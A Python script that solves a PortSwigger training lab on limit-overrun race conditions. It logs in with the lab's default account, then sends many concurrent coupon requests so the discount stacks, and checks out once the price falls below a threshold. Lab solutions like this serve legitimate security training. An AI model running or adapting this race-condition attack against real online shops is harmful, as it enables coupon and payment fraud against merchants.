"""
Exploit for lab:
    Limit overrun race conditions
    https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun

By Xqweak.
"""
import requests
from bs4 import BeautifulSoup
import argparse
from pprint import pprint
import threading
import warnings
warnings.filterwarnings("ignore")

def apply_coupon(url,session_cookie,csrf_token):
    coupon_url = f'{url}/cart/coupon'
    coupon = "PROMO20"
    data = {
            'coupon':coupon,
            "csrf":csrf_token,
            }
    cookie = {"session":session_cookie}
    ans = requests.post(coupon_url , data, cookies = cookie , verify=False)
    #print(ans.status_code)
    if('Coupon applied' in str(ans.content)):
        print('coupon applied!!!')
    return ans


class RaceConditioner:
    def __init__(self, url):
        self.url = url

    def grab_cookies(self):
        # Login and create the session
        s = requests.Session()
        s.verify = False
        login_url = f"{self.url}/login"
        print(f'logging in {self.url}')
        c = s.get(login_url)
        soup = BeautifulSoup(c.content, 'lxml')
        token = soup.find('input',{"name":"csrf"})["value"]
        acc_details = {
                "username":"wiener",
                "password":"peter",
                "csrf":token
                }
        pprint(acc_details)
        s.post(login_url , acc_details)
        print(f"logued under session cookie {s.cookies['session']}")
        return s , s.cookies["session"]

    def place_one_l33t_jacket(self):
        s, session_cookie = self.grab_cookies()
        cart_url = f"{self.url}/cart"
        cookies = {
                "session":session_cookie,
                }
        # Add one jacket to the cart
        jacket_data = {
                "productId":1,
                "redir":"PRODUCT",
                "quantity":1
                }
        s.post(cart_url , jacket_data)
        return s

    def race_l33t_coupon(self, n_threads):
        # Exploit race condition vulnearbility to buy the jacket
        s = self.place_one_l33t_jacket()
        s_cookie = s.cookies["session"]
        attack_url = f'{self.url}'
        csrf_token = BeautifulSoup(s.get(f'{self.url}/cart').content,'lxml').find('input',{"name":"csrf"})['value']
        # ans =  apply_coupon(attack_url, s_cookie, csrf_token)
        # Attack with n threads
        print('preparing the attack...')
        threads = [threading.Thread(target=apply_coupon, args=(attack_url,s_cookie, csrf_token)) for i in range(n_threads)]
        print('attacking...')
        for i in threads:
            i.start()
        for i in threads:
            i.join()
        # Get discount
        c = s.get(f'{self.url}/cart')
        soup = BeautifulSoup(c.content,'lxml') 
        price = int(soup.findAll('th')[-1].text.replace("$","").split(".")[0])
        print(f'after this attack, price is {price}')
        if(price < 50):
            print('Hacked!!!')
            data = {
                    "csrf":csrf_token
                    }
            s.post(f'{self.url}/cart/checkout', data)
        else:
            print('failed, trying again...')
            self.race_l33t_coupon(n_threads)
        

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u' ,'--url', required=True, help="Lab of portswigger academy url", type=str )
    parser.add_argument('-n', '--number_of_threads', required=True, help="Number of threads to perform race condition attack", type=int)
    args = parser.parse_args()
    lab = RaceConditioner(args.url)
    print(f'starting attack with {args.number_of_threads}')
    lab.race_l33t_coupon(args.number_of_threads)
